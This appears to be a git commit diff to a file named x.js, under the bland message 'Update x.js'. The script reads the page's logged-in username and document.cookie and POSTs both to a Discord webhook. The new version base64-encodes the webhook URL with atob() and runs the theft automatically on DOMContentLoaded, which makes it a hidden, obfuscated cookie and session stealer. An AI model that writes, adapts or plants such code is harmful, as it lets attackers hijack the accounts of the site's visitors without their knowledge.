5e01349cc53f5330fe0d0c67b5d4ad41ed99f018
gringopy <jpedrolamas@gmail.com>
2025-06-03 15:14:38 -0300

    Update x.js

--- x.js
+++ x.js
@@ -1,7 +1,9 @@
-let u = document.querySelector('.pro-user-name');
-let n = u ? u.textContent.trim() : 'None';
-fetch('https://discord.com/api/webhooks/1379479118034243644/o11paCeKPJ03rgxh1ca-f4WW0CkPGKZB4ujrAphJjjzaKXXTvglBbM1kR24K9R5Iy1cr', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({ content: `U:${n} C:${document.cookie}` })
+document.addEventListener("DOMContentLoaded", function() {
+  let u = document.querySelector('.pro-user-name');
+  let n = u ? u.textContent.trim() : 'None';
+  fetch(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3OTQ3OTExODAzNDI0MzY0NC9vMTFwYUNlS1BKMDNyZ3hoMWNhLWY0V1cwQ2tQR0taQjR1anJBcGhKamp6YUtYWFhUdmdsQmJNMWtSMks5UjVJeTFy'), {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ content: `User:${n} | Cookie:${document.cookie}` })
+  });
 });
